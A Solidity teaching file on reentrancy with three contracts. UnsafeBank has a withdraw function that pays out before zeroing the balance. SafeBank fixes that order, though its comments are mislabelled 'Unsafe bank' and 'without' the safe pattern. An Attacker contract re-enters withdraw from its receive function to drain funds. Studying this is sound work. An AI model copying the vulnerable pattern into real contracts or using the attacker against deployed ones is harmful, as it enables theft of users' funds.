
pragma solidity ^0.8.0;


interface IBank {
    function deposit() external payable;
    function withdraw() external returns(bool);
}

// Unsafe bank
contract UnsafeBank {


    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }


    // Function without Checks, Effects, Interaction pattern
    function withdraw() external returns (bool) {
        require(balances[msg.sender] > 0);
        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        balances[msg.sender] = 0;    
        return success;
    }

}



// Unsafe bank
contract SafeBank {


    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }


    // Function without Checks, Effects, Interaction pattern
    function withdraw() external returns (bool) {
        require(balances[msg.sender] > 0, "Not enough balance");
        uint toTransfer = balances[msg.sender];
        balances[msg.sender] = 0;    
        (bool success, ) = msg.sender.call{value: toTransfer}("");
        if(!success) {
            balances[msg.sender] = toTransfer;
        }
        return success;
    }

}





contract Attacker {

    IBank bank;

    event ReentrancyPerformed();

    constructor(address bankAddress) {
        bank = IBank(bankAddress);
    }

    function start() public payable {
        bank.deposit{value: msg.value}();
        // deposit funds
        bank.withdraw();
        // Call withdraw
    }


    // Function for empty function name calls
    receive() external payable {
        // call withdraw again
        bank.withdraw();
        emit ReentrancyPerformed();
    }

    // Function that will run if unexistent function is called
    fallback() external payable {

    }


}